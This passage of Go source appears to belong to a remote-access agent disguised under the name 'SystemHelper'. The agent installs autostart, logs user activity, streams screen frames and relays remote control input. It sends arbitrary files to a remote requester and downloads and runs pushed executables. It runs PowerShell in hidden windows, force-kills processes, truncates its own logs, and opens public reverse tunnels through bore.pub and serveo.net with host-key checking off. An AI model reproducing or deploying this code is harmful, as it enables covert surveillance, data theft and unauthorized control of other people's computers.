	Frame   string                 `json:"frame,omitempty"`
	Display int                    `json:"display,omitempty"`
	Fps     int                    `json:"fps,omitempty"`
	Command string                 `json:"command,omitempty"`
	Params  map[string]string      `json:"params,omitempty"`
	Data    map[string]interface{} `json:"data,omitempty"`
}

func main() {
	runtime.LockOSThread()
	
	fmt.Println("SystemHelper v" + Version + " starting...")
	fmt.Println("Logs: " + filepath.Join(dataDir(), "agent.log"))
	
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT, syscall.SIGKILL, syscall.SIGQUIT)
	go func() {
		sig := <-sigCh
		fmt.Fprintf(os.Stderr, "RECEIVED SIGNAL: %v\n", sig)
		log("RECEIVED SIGNAL: " + sig.String())
		os.Exit(0)
	}()
	
	useMode := ""
	for i := 0; i < len(os.Args); i++ {
		arg := os.Args[i]
		if arg == "--server" || arg == "-s" {
			isServerMode = true
		}
		if arg == "--internal" || arg == "-i" {
			isInternalMode = true
		}
		if arg == "--org" || arg == "-o" {
			if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
		}
		if arg == "--use" || arg == "-u" {
			if i+1 < len(os.Args) {
				useMode = os.Args[i+1]
			}
		}
		if arg == "--update-config" || arg == "-uc" {
			log("Manual config update requested...")
			loadCustomUrls()
			log("Config updated. URLs: " + strings.Join(serverUrls, ", "))
			os.Exit(0)
		}
		if arg == "--help" || arg == "-h" || arg == "/?" {
			fmt.Println("SystemHelper v" + Version)
			fmt.Println("")
			fmt.Println("Usage:")
			fmt.Println("  SystemHelper.exe                  Auto mode (try all)")
			fmt.Println("  SystemHelper.exe --server         Force this PC to be the server")
			fmt.Println("  SystemHelper.exe --org <name>       Set organization name (for multi-org)")
			fmt.Println("  SystemHelper.exe --internal          Internal mode (no cloud, one file)")
			fmt.Println("  SystemHelper.exe --internal --server Internal mode as server")
			fmt.Println("  SystemHelper.exe --setup-internal Create urls.ini for internal mode")
			fmt.Println("  SystemHelper.exe --setup-org <name> Create org folder with config")
			fmt.Println("  SystemHelper.exe --use <name>     Use only specific server:")
			fmt.Println("    Names: render, ngrok, cloudflare, direct, local")
			fmt.Println("  SystemHelper.exe --update-config  Force refresh server list from GitHub")
			fmt.Println("")
			fmt.Println("Examples:")
			fmt.Println("  SystemHelper.exe --internal           Run in internal mode (no cloud)")
			fmt.Println("  SystemHelper.exe --internal --server  Internal mode + become server")
			fmt.Println("  SystemHelper.exe --setup-internal     Create urls.ini file")
			fmt.Println("  SystemHelper.exe --setup-org Office1  Create 'Office1' folder")
			fmt.Println("  SystemHelper.exe --use render         Only use Render.com")
			fmt.Println("")
			fmt.Println("Config files (in %APPDATA%\\SystemHelper\\):")
			fmt.Println("  auth.ini   - Change password")
			fmt.Println("  urls.ini   - Custom server URLs")
			fmt.Println("  agent.ini  - Server preference")
			os.Exit(0)
		}
		if arg == "--setup-internal" {
			setupInternalMode()
		}
		if strings.HasPrefix(arg, "--setup-org") {
			orgName := ""
			if strings.Contains(arg, "=") {
				orgName = strings.SplitN(arg, "=", 2)[1]
			} else if i+1 < len(os.Args) {
				orgName = os.Args[i+1]
			}
			if orgName != "" {
				setupOrgMode(orgName)
			}
		}
	}

	// Apply --use filter
	
	if useMode != "" {
		if url, ok := serverNames[useMode]; ok {
			serverUrls = []string{url}
			log("Manual mode: using " + useMode + " (" + url + ")")
		} else {
			log("Unknown server name: " + useMode + ". Using auto mode.")
		}
	}
	
	startUrlRefresher()

	preventDuplicate()
	loadAgentId()
	go setupAutostart()
	startActivityLogger()
	startConfigServer()
	startAutoUpdater()
	startPopupKiller()

	// Smart server detection: check if anything is already listening on port 3000
	// Logic:
	//   1. Nothing on 3000 → start our own server
	//   2. Something on 3000 → check if it's OUR agent (via config port 8181)
	//      a. Same version → duplicate, just connect as agent
	//      b. Older version → kill old process, take over port 3000
	//      c. Different process (Node.js) → use it as server, connect as agent
	localServerRunning := false
	conn, err := net.DialTimeout("tcp", "127.0.0.1:3000", 1*time.Second)
	if err == nil {
		conn.Close()
		localServerRunning = true

		// Check if the existing server is an older version of OUR agent
		// by querying the config panel on port 8181
		resp, fetchErr := http.Get("http://127.0.0.1:8181/api/status")
		if fetchErr == nil && resp != nil {
			defer resp.Body.Close()
			var status map[string]interface{}
			if json.NewDecoder(resp.Body).Decode(&status) == nil {
				if ver, ok := status["version"].(string); ok {
					if ver != Version {
						log("⚠️ Found older agent v" + ver + " on port 3000 — killing it to take over with v" + Version)
						// Find and kill the old process
						cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
							"Get-Process -Name 'SystemHelper' | Where-Object { $_.Id -ne "+strconv.Itoa(os.Getpid())+" } | Stop-Process -Force")
						hideCmd(cmd)
						cmd.Run()
						time.Sleep(2 * time.Second)
						localServerRunning = false // Port should be free now
						log("✅ Old agent killed, port 3000 is now free")
					} else {
						log("✅ Found same version v" + ver + " already running — connecting as agent")
					}
				}
			}
		}
		if localServerRunning {
			log("✅ Found existing server on localhost:3000 — using it")
		}
	}

	preferredServer := loadServerPreference()
	if !localServerRunning && (isServerMode || preferredServer) {
		log("No server found → starting local server on port 3000")
		go runServer()
		// Wait for our server to be ready before connecting
		for i := 0; i < 15; i++ {
			c, e := net.DialTimeout("tcp", "127.0.0.1:3000", 500*time.Millisecond)
			if e == nil { c.Close(); break }
			time.Sleep(1 * time.Second)
		}
	} else if !localServerRunning && !isServerMode && !preferredServer {
		// Not designated as server, but nothing else is running — scan network
		log("No local server → scanning network for server...")
		serverIP := discoverServer()
		if serverIP != "" {
			log("Found server at: " + serverIP)
			serverUrls = append(serverUrls, "ws://"+serverIP+":3000")
		} else {
			// Truly alone — start our own server as fallback
			log("No server found on network → starting local server on port 3000")
			go runServer()
			for i := 0; i < 15; i++ {
				c, e := net.DialTimeout("tcp", "127.0.0.1:3000", 500*time.Millisecond)
				if e == nil { c.Close(); break }
				time.Sleep(1 * time.Second)
			}
		}
	}
	log("Agent ID: " + agentId)
	log("SystemHelper v" + Version + " — Zero-config, self-healing, auto-updating")
	
	// Start connecting — this now runs forever with independent reconnection
	connect()
}

func loadServerPreference() bool {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	data, err := os.ReadFile(cfgFile)
	if err != nil { return false }
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "prefer_server=true" {
			return true
		}
	}
	return false
}

func saveServerPreference(prefer bool) {
	cfgFile := filepath.Join(dataDir(), "agent.ini")
	val := "false"
	if prefer { val = "true" }
	os.WriteFile(cfgFile, []byte("prefer_server="+val+"\n"), 0644)
}

func handleRemoteUpdate(filename, data string) {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	tmpPath := filepath.Join(dir, filename + ".tmp")
	
	// Decode and save
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("Update decode failed: " + err.Error()); return }
	
	err = os.WriteFile(tmpPath, decoded, 0644)
	if err != nil { log("Update write failed: " + err.Error()); return }
	
	log("Update received: " + filename + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ")")
	
	// Replace original and restart
	exePath := filepath.Join(dir, filename)
	os.Rename(tmpPath, exePath)
	
	log("Update applied. Restarting...")
	
	// Start new version and exit this one
	cmd := exec.Command(exePath)
	hideCmd(cmd)
	cmd.Start()
	os.Exit(0)
}

func loadAgentId() {
	cfgFile := filepath.Join(dataDir(), "agent.id")
	data, _ := os.ReadFile(cfgFile)
	if len(data) > 0 { agentId = string(data); return }
	agentId = hostname + "-" + fmt.Sprintf("%x", time.Now().UnixNano())[:8]
	os.WriteFile(cfgFile, []byte(agentId), 0644)
}

func setupInternalMode() {
	exe, _ := os.Executable()
	dir := filepath.Dir(exe)
	urlsPath := filepath.Join(dir, "urls.ini")
	os.WriteFile(urlsPath, []byte("auto-local\n"), 0644)
	
	fmt.Println("✅ Internal mode configured!")
	fmt.Println("   Created: " + urlsPath)
	fmt.Println("")
	fmt.Println("   To start as SERVER on this PC:")
	fmt.Println("     SystemHelper.exe --server")
	fmt.Println("")
	fmt.Println("   Other PCs: copy urls.ini next to SystemHelper.exe")
	fmt.Println("   They will auto-discover the server on the network.")
	fmt.Println("")
	os.Exit(0)
}

func setupOrgMode(name string) {
	exe, _ := os.Executable()
	orgDir := filepath.Join(filepath.Dir(exe), name)
	os.MkdirAll(orgDir, 0755)
	
	// Copy .exe to org folder
	src, _ := os.ReadFile(exe)
	os.WriteFile(filepath.Join(orgDir, "SystemHelper.exe"), src, 0755)
	
	// Create urls.ini
	os.WriteFile(filepath.Join(orgDir, "urls.ini"), []byte("auto-local\n# org="+name+"\n"), 0644)
	
	// Create README
	readme := "INTERNAL SERVER - " + name + "\n" +
		"========================\n\n" +
		"Organization: " + name + "\n\n" +
		"SERVER SETUP:\n" +
		"  1. Copy this folder to the server PC\n" +
		"  2. Run: SystemHelper.exe --server\n" +
		"  3. Dashboard: http://[SERVER-IP]:3000\n\n" +
		"AGENT SETUP:\n" +
		"  1. Copy this folder to each agent PC\n" +
		"  2. Double-click SystemHelper.exe\n" +
		"  3. Agents auto-connect to the server\n\n" +
		"All PCs must be on the same network.\n"
	os.WriteFile(filepath.Join(orgDir, "README.txt"), []byte(readme), 0644)
	
	fmt.Println("✅ Organization '" + name + "' setup complete!")
	fmt.Println("   Folder: " + orgDir)
	fmt.Println("")
	fmt.Println("   Files created:")
	fmt.Println("     " + name + "\\SystemHelper.exe")
	fmt.Println("     " + name + "\\urls.ini")
	fmt.Println("     " + name + "\\README.txt")
	fmt.Println("")
	fmt.Println("   Copy this folder to all PCs in the organization.")
	os.Exit(0)
}

func cleanupLogs() {
	log("Cleaning logs...")
	dir := dataDir()
	
	// Delete activity logs older than 30 days
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil { return nil }
		if !info.IsDir() && strings.HasPrefix(info.Name(), "activity-") {
			if time.Since(info.ModTime()).Hours() > 24*30 { // 30 days
				os.Remove(path)
				log("Removed old log: " + info.Name())
			}
		}
		return nil
	})
	
	// Clear agent.log
	os.Truncate(filepath.Join(dir, "agent.log"), 0)
	
	// Clear error.log
	os.Truncate(filepath.Join(dir, "error.log"), 0)
	
	// Send status to server
	activeConnsMu.RLock()
	for _, sc := range activeConnections {
		if sc == nil || sc.dead { continue }
		sc.mu.Lock()
		if sc.conn != nil {
			sc.conn.WriteJSON(Message{Type: "agent-log", Frame: "Logs cleaned"})
		}
		sc.mu.Unlock()
	}
	activeConnsMu.RUnlock()
	log("Logs cleaned")
}

type serverConnection struct {
	url      string
	name     string
	conn     *websocket.Conn
	dead     bool
	lastSend time.Time
	mu       sync.Mutex
}

var activeConnections []*serverConnection
var activeConnsMu sync.RWMutex
var serverUrlsMu sync.RWMutex // Protects serverUrls global slice
var connWriteMu sync.Mutex // Protects concurrent WebSocket writes (Gorilla WS is not thread-safe)

// safeWriteJSON wraps Gorilla WebSocket WriteJSON with a mutex to prevent concurrent write panics
func safeWriteJSON(conn *websocket.Conn, v interface{}) error {
	connWriteMu.Lock()
	defer connWriteMu.Unlock()
	return conn.WriteJSON(v)
}

// safeWriteMessage wraps Gorilla WebSocket WriteMessage with a mutex
func safeWriteMessage(conn *websocket.Conn, messageType int, data []byte) error {
	connWriteMu.Lock()
	defer connWriteMu.Unlock()
	return conn.WriteMessage(messageType, data)
}

func logEventDate(msg string) {
	path := filepath.Join(dataDir(), "activity-"+time.Now().Format("2006-01-02")+".log")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("2006-01-02 15:04:05") + " " + msg + "\n")
}

func logEvent(path, msg string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(time.Now().Format("01-02 15:04") + " " + msg + "\n")
}


func cleanOldReceived() {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		path := filepath.Join(dir, e.Name())
		os.RemoveAll(path)
	}
}

func sanitizeFilename(name string) string {
	name = filepath.Base(name)
	name = strings.Map(func(r rune) rune {
		if r >= 32 && r <= 126 && r != '/' && r != '\\' && r != ':' && r != '*' && r != '?' && r != '"' && r != '<' && r != '>' && r != '|' {
			return r
		}
		return '_'
	}, name)
	if name == "" || name == "." || name == ".." {
		return "unnamed_file"
	}
	if len(name) > 255 {
		name = name[:255]
	}
	return name
}

func handleFileTransfer(filename, data string) {
	dir := receivedDir()
	os.MkdirAll(dir, 0755)
	safeName := sanitizeFilename(filename)
	dest := filepath.Join(dir, safeName)
	if !strings.HasPrefix(dest, dir) {
		log("File transfer path traversal blocked: " + filename)
		return
	}
	
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil { log("File transfer decode failed: " + err.Error()); return }
	
	err = os.WriteFile(dest, decoded, 0644)
	if err != nil { log("File transfer write failed: " + err.Error()); return }
	
	log("File received: " + safeName + " (" + fmt.Sprintf("%d bytes", len(decoded)) + ") saved to " + dest)
}

func sanitizePath(path string) string {
	clean := filepath.Clean(path)
	if !filepath.IsAbs(clean) {
		if runtime.GOOS == "windows" {
			clean = filepath.Join("C:\\", clean)
		} else {
			clean = filepath.Join("/", clean)
		}
	}
	return clean
}

func handleFileRequest(path string, conn *websocket.Conn) {
	if path == "" {
		log("File request: empty path rejected")
		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: empty path"})
		return
	}
	safePath := sanitizePath(path)
	data, err := os.ReadFile(safePath)
	if err != nil {
		log("File request failed: " + err.Error())
		conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: "error: " + err.Error()})
		return
	}
	encoded := base64.StdEncoding.EncodeToString(data)
	conn.WriteJSON(Message{Type: "file-response", Command: path, Frame: encoded})
	log("File sent: " + safePath + " (" + fmt.Sprintf("%d bytes", len(data)) + ")")
}

func sshAvailable() bool {
	_, err := exec.LookPath("ssh")
	return err == nil
}

func startTunnel(ws *websocket.Conn) {
	tunnelMode := "auto"
	if data, err := os.ReadFile(filepath.Join(dataDir(), "tunnel.ini")); err == nil {
		tunnelMode = strings.TrimSpace(string(data))
	}
	log("Tunnel mode: " + tunnelMode + ", SSH available: " + fmt.Sprintf("%v", sshAvailable()))
	
	go func() {
		var url string
		var lastErr string
		
		// Try bore.pub FIRST (no SSH needed, reliable on Windows)
		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
			log("Trying bore.pub...")
			borePath := filepath.Join(dataDir(), "bore.exe")
			if _, err := os.Stat(borePath); os.IsNotExist(err) {
				log("Downloading bore...")
				dl := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
					"$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' -OutFile '"+
					filepath.Join(dataDir(), "bore.zip")+"' ; Expand-Archive '"+filepath.Join(dataDir(), "bore.zip")+"' -DestinationPath '"+
					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
				hideCmd(dl)
				if err := dl.Run(); err != nil {
					lastErr = "bore download: " + err.Error()
					log("bore download failed: " + err.Error())
				}
			}
			if _, err := os.Stat(borePath); err == nil {
				cmd := exec.Command(borePath, "local", "3000", "--to", "bore.pub")
				hideCmd(cmd)
				stdout, _ := cmd.StdoutPipe()
				if err := cmd.Start(); err != nil {
					lastErr = "bore start: " + err.Error()
					log("bore start failed: " + err.Error())
				} else {
					buf := make([]byte, 1024)
					n, _ := stdout.Read(buf)
					outLine := stripANSI(strings.TrimSpace(string(buf[:n])))
					log("bore output: " + outLine)
					// Try multiple formats:
					// 1. "remote_port=15517"
					// 2. "2026-05-16T09:02:01.847796Z 12345"
					// 3. "12345"
					if idx := strings.Index(outLine, "remote_port="); idx >= 0 {
						portStr := strings.TrimSpace(outLine[idx+len("remote_port="):])
						portEnd := strings.IndexAny(portStr, " \t\n\r")
						if portEnd > 0 { portStr = portStr[:portEnd] }
						if p, err := strconv.Atoi(portStr); err == nil && p > 1000 && p < 65536 {
							url = "http://bore.pub:" + strconv.Itoa(p)
						}
					}
					if url == "" {
						parts := strings.Fields(outLine)
						for _, part := range parts {
							if p, err := strconv.Atoi(part); err == nil && p > 1000 && p < 65536 {
								url = "http://bore.pub:" + strconv.Itoa(p)
								break
							}
						}
					}
					if url == "" {
						lastErr = "bore: no port in output: " + outLine
					}
				}
			} else {
				lastErr = "bore.exe not found after download"
			}
		}
		
		// Try localhost.run (SSH) as fallback
		if url == "" && (tunnelMode == "auto" || tunnelMode == "localhost.run") && sshAvailable() {
			log("Trying localhost.run...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "localhost.run")
			hideCmd(cmd)
			stdout, _ := cmd.StdoutPipe()
			if err := cmd.Start(); err != nil {
				lastErr = "localhost.run: " + err.Error()
				log("localhost.run start failed: " + err.Error())
			} else {
				done := make(chan string, 1)
				go func() {
					buf := make([]byte, 4096)
					n, _ := stdout.Read(buf)
					done <- string(buf[:n])
				}()
				select {
				case out := <-done:
					for _, line := range strings.Split(out, "\n") {
						if strings.Contains(line, "https") && strings.Contains(line, "localhost.run") {
							url = strings.TrimSpace(line)
							break
						}
					}
					if url == "" {
						lastErr = "localhost.run: no URL in output"
					}
				case <-time.After(15 * time.Second):
					lastErr = "localhost.run: timeout (SSH connected but no URL within 15s)"
					log("localhost.run: timeout waiting for URL")
				}
			}
		} else if url == "" && !sshAvailable() {
			lastErr = "SSH not available on this system"
		}
		
		// Try serveo.net (SSH, more reliable)
		if url == "" && (tunnelMode == "auto" || tunnelMode == "serveo") && sshAvailable() {
			log("Trying serveo.net...")
			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
				"-o", "ConnectTimeout=10",
				"-R", "80:localhost:3000", "serveo.net")
			hideCmd(cmd)
			stdout, _ := cmd.StdoutPipe()
			if err := cmd.Start(); err != nil {
				lastErr = "serveo: " + err.Error()
				log("serveo.net start failed: " + err.Error())
			} else {
				done := make(chan string, 1)
				go func() {
					buf := make([]byte, 4096)
					n, _ := stdout.Read(buf)
					done <- string(buf[:n])
				}()
				select {
				case out := <-done:
					for _, line := range strings.Split(out, "\n") {
						if strings.Contains(line, "http") && strings.Contains(line, "serveo.net") {
							url = strings.TrimSpace(line)
							break
						}
					}
					if url == "" {
						lastErr = "serveo: no URL in output"
					}
				case <-time.After(15 * time.Second):
					lastErr = "serveo: timeout"
					log("serveo.net: timeout waiting for URL")
				}
			}
		}
		
		if url != "" {
			log("Tunnel URL: " + url)
			os.WriteFile(filepath.Join(dataDir(), "tunnel.url"), []byte(url), 0644)
			if ws != nil { safeWriteJSON(ws, Message{Type: "tunnel-status", Command: url, Frame: "ready"}) }
		} else {
			reason := lastErr
			if reason == "" { reason = "All tunnels failed (no reason)" }
			log("All tunnels failed: " + reason)
			if ws != nil { safeWriteJSON(ws, Message{Type: "tunnel-status", Command: reason, Frame: "failed"}) }
		}
	}()
}

// ============ SERVER MODE ============
func runServer() {
	log("SERVER MODE on port 3000")
	setupAutostart()
	startActivityLogger()
	agents := make(map[string]*AgentInfo)
	dashboards := make(map[*websocket.Conn]bool)
	remoteSessions := make(map[string]*websocket.Conn) // code -> user WS connection

	// Heartbeat checker: detect dead agents that didn't disconnect cleanly
	go func() {
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			now := time.Now()
			var deadAgents []string
			for id, a := range agents {
				if now.Sub(a.LastSeen) > 5*time.Minute {
					deadAgents = append(deadAgents, id)
				}
			}
			for _, id := range deadAgents {
				a := agents[id]
				delete(agents, id)
				log("Heartbeat timeout: removing stale agent " + id + " (last seen " + a.LastSeen.Format("15:04:05") + ")")
				for dash := range dashboards {
					dash.WriteJSON(map[string]interface{}{"type": "agent-disconnected", "agentId": id})
				}
			}
		}
	}()

	// Generate auth token from credentials
	authToken := sha256Hex(authUser + ":" + authPass)

	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")
		list := []map[string]interface{}{}
		for id, a := range agents {
			list = append(list, map[string]interface{}{"id": id, "name": a.Name})
		}
		json.NewEncoder(w).Encode(list)
	})

	upgrader := websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		t := r.URL.Query().Get("token")
		if t == "" || t != authToken {
			if !checkAuth(w, r) { return }
		}
		conn, _ := upgrader.Upgrade(w, r, nil)
		if conn == nil { return }
		defer conn.Close()

		var role, agentIdPtr string
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil { break }
			var d Message
			json.Unmarshal(msg, &d)

			switch d.Type {
			case "agent-hello":
				role = "agent"
				agentIdPtr = d.AgentId
				data := d.Data
				if data == nil { data = make(map[string]interface{}) }
				agents[d.AgentId] = &AgentInfo{
					Ws:           conn,
					Name:         d.Name,
					Hostname:     strVal(data["hostname"]),
					LocalIP:      strVal(data["localIP"]),
					PublicIP:     strVal(data["publicIP"]),
					AgentIP:      strVal(data["agentIP"]),
					Org:          d.Org,
					Version:      strVal(data["version"]),
					BootTime:     strVal(data["bootTime"]),
					ProgramStart: strVal(data["programStart"]),
					ConnectionId: strVal(data["connectionId"]),
					Viewers:      make(map[*websocket.Conn]bool),
					LastSeen:     time.Now(),
				}
				log("Agent connected: " + d.Name + " (local=" + agents[d.AgentId].LocalIP + " public=" + agents[d.AgentId].PublicIP + ")")
				// Broadcast to all dashboards
				for dash := range dashboards {
					dash.WriteJSON(map[string]interface{}{
						"type":     "agent-connected",
						"agentId":  d.AgentId,
						"name":     d.Name,
						"hostname": agents[d.AgentId].Hostname,
						"ip":       agents[d.AgentId].LocalIP,
						"localIP":  agents[d.AgentId].LocalIP,
						"publicIP": agents[d.AgentId].PublicIP,
						"org":      d.Org,
						"version":  agents[d.AgentId].Version,
					})
				}
			case "agent-frame":
				if a, ok := agents[d.AgentId]; ok {
					a.LastSeen = time.Now()
					if d.Display == 0 { a.LastFrame = d.Frame }
					for v := range a.Viewers { v.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: d.Frame, Display: d.Display}) }
				}
			case "agent-status":
				if a, ok := agents[d.AgentId]; ok {
					a.LastSeen = time.Now()
					sd := d.Data
					if sd == nil { sd = make(map[string]interface{}) }
					a.Uptime = intVal(sd["uptime"])
					a.TotalIdle = int64Val(sd["totalIdle"])
					a.TotalActive = int64Val(sd["totalActive"])
					a.CurrentState = strVal(sd["currentState"])
					// Forward to dashboards
					for dash := range dashboards {
						dash.WriteJSON(map[string]interface{}{
							"type":        "agent-status",
							"agentId":     d.AgentId,
							"uptime":      a.Uptime,
							"totalIdle":   a.TotalIdle,
							"totalActive": a.TotalActive,
							"currentState": a.CurrentState,
							"version":     strVal(sd["version"]),
						})
					}
				}
			case "ip-update":
				if a, ok := agents[d.AgentId]; ok {
					sd := d.Data
					if sd == nil { sd = make(map[string]interface{}) }
					a.LocalIP = strVal(sd["localIP"])
					a.PublicIP = strVal(sd["publicIP"])
					// Forward to dashboards
					for dash := range dashboards {
						dash.WriteJSON(map[string]interface{}{
							"type":     "ip-update",
							"agentId":  d.AgentId,
							"localIP":  a.LocalIP,
							"publicIP": a.PublicIP,
						})
					}
				}
			case "tunnel-status":
				if a, ok := agents[d.AgentId]; ok {
					a.TunnelURL = d.Command
					// Forward to dashboards
					for dash := range dashboards {
						dash.WriteJSON(map[string]interface{}{
							"type":    "tunnel-status",
							"agentId": d.AgentId,
							"command": d.Command,
							"frame":   d.Frame,
						})
					}
				}
			case "agent-log":
				// Forward logs to dashboards if needed
				for dash := range dashboards {
					dash.WriteJSON(map[string]interface{}{
						"type":    "agent-log",
						"agentId": d.AgentId,
						"frame":   d.Frame,
					})
				}
			case "dashboard-hello":
				role = "dashboard"
				dashboards[conn] = true
				// Send current agent list with full data
				list := []map[string]interface{}{}
				for id, a := range agents {
					list = append(list, map[string]interface{}{
						"id":         id,
						"name":       a.Name,
						"hostname":   a.Hostname,
						"localIP":    a.LocalIP,
						"publicIP":   a.PublicIP,
						"org":        a.Org,
						"version":    a.Version,
						"uptime":     a.Uptime,
						"totalIdle":  a.TotalIdle,
						"totalActive": a.TotalActive,
						"currentState": a.CurrentState,
						"tunnelURL":  a.TunnelURL,
					})
				}
				conn.WriteJSON(map[string]interface{}{"type": "agent-list", "agents": list})
			case "view-agent":
				if a, ok := agents[d.AgentId]; ok {
					a.Viewers[conn] = true
					if a.LastFrame != "" { conn.WriteJSON(Message{Type: "frame", AgentId: d.AgentId, Frame: a.LastFrame}) }
				}
			case "stop-viewing":
				for _, a := range agents { delete(a.Viewers, conn) }
			case "control":
				if a, ok := agents[d.AgentId]; ok { a.Ws.WriteJSON(Message{Type: "control", Command: d.Command, Params: d.Params}) }
			case "set-server-preference":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "set-server-preference", Command: d.Command})
					log("Set server pref for " + d.AgentId + " = " + d.Command)
				}
			case "become-server":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "become-server"})
					log("Forwarded become-server to " + d.AgentId)
				}
			case "file-transfer":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "file-transfer", Command: d.Command, Frame: d.Frame})
					log("Forwarded file-transfer to " + d.AgentId)
				}
			case "request-file":
				if a, ok := agents[d.AgentId]; ok {
					a.Ws.WriteJSON(Message{Type: "request-file", Command: d.Command})
					log("Forwarded request-file to " + d.AgentId)
				}
			case "remote-assistant-create":
				// Remote user creates a session with a code
				code := d.Command
				if code == "" {
					// Generate a random code
					code = fmt.Sprintf("%06d", time.Now().UnixNano()%1000000)
				}
				remoteSessions[code] = conn
				conn.WriteJSON(map[string]interface{}{"type": "remote-assistant-created", "code": code})
				log("Remote assistant session created: " + code)
			case "remote-assistant-join":
				// Admin joins a session by code
				code := d.Command
				if userConn, ok := remoteSessions[code]; ok {
					userConn.WriteJSON(map[string]interface{}{"type": "remote-assistant-joined", "adminId": d.AgentId})
					// Forward frames from user to admin
					go func() {
						for {
							_, msg, err := userConn.ReadMessage()
							if err != nil { break }
							var um Message
							if json.Unmarshal(msg, &um) == nil && um.Type == "remote-assistant-frame" {
								conn.WriteJSON(map[string]interface{}{"type": "remote-assistant-frame", "frame": um.Frame, "code": code})
							}
						}
						delete(remoteSessions, code)
					}()
					// Forward control commands from admin to user
					go func() {
						for {
							_, msg, err := conn.ReadMessage()
							if err != nil { break }
							var um Message
							if json.Unmarshal(msg, &um) == nil && um.Type == "control" {
								userConn.WriteJSON(um)
							}
						}
					}()
					conn.WriteJSON(map[string]interface{}{"type": "remote-assistant-joined", "success": true, "code": code})
					log("Admin joined remote session: " + code)
				} else {
					conn.WriteJSON(map[string]interface{}{"type": "remote-assistant-join-error", "error": "Session not found"})
				}
			}
		}
		if role == "agent" && agentIdPtr != "" {
			delete(agents, agentIdPtr)
			log("Agent disconnected: " + agentIdPtr)
			// Broadcast to all dashboards
			for dash := range dashboards {
				dash.WriteJSON(map[string]interface{}{"type": "agent-disconnected", "agentId": agentIdPtr})
			}
		}
		if role == "dashboard" {
			delete(dashboards, conn)
		}
	})

	// NOTE: Embedded agent removed. The main agent process handles all monitoring.
	// The embedded agent caused conflicts by using the same agentId as the main agent,
	// causing the agent to appear offline when the embedded agent disconnected.

	// Serve dashboard from file system (dashboard.html) with embedded fallback
	// This allows instant dashboard changes without rebuilding the .exe
	dashboardPath := filepath.Join(filepath.Dir(os.Args[0]), "dashboard.html")
	
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		w.Header().Set("Access-Control-Allow-Origin", "*")

		// Advanced routes for dashboard features
		if r.URL.Path == "/view/" || strings.HasPrefix(r.URL.Path, "/view/") {
			agentId := strings.TrimPrefix(r.URL.Path, "/view/")
			serveViewPage(w, r, agentId, authToken)
			return
		}
		if r.URL.Path == "/remote-assistant" {
			serveRemoteAssistant(w, r, authToken)
			return
		}
		if r.URL.Path == "/multi-control" {
			serveMultiControl(w, r, authToken)
			return
		}
		if r.URL.Path == "/api/server-list" {
			serverUrlsMu.RLock()
			urlsCopy := make([]string, len(serverUrls))
			copy(urlsCopy, serverUrls)
			serverUrlsMu.RUnlock()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{"urls": urlsCopy})
			return
		}
		if r.URL.Path == "/api/update-server-list" && r.Method == "POST" {
			var body struct { URLs []string `json:"urls"` }
			json.NewDecoder(r.Body).Decode(&body)
			if len(body.URLs) > 0 {
				serverUrlsMu.Lock()
				serverUrls = body.URLs
				serverUrlsMu.Unlock()
				dataFile := filepath.Join(dataDir(), "urls.ini")
				os.WriteFile(dataFile, []byte(strings.Join(body.URLs, "\n")+"\n"), 0644)
				log("Server list updated via dashboard: " + strings.Join(body.URLs, ", "))
				// Notify all connected agents
				activeConnsMu.RLock()
				notified := 0
				for _, sc := range activeConnections {
					if sc == nil || sc.dead { continue }
					sc.mu.Lock()
					if sc.conn != nil {
						sc.conn.WriteJSON(Message{Type: "update-server-list", Data: map[string]interface{}{"urls": body.URLs}})
						notified++
					}
					sc.mu.Unlock()
				}
				activeConnsMu.RUnlock()
				w.Header().Set("Content-Type", "application/json")
				json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "agentsNotified": notified})
				return
			}
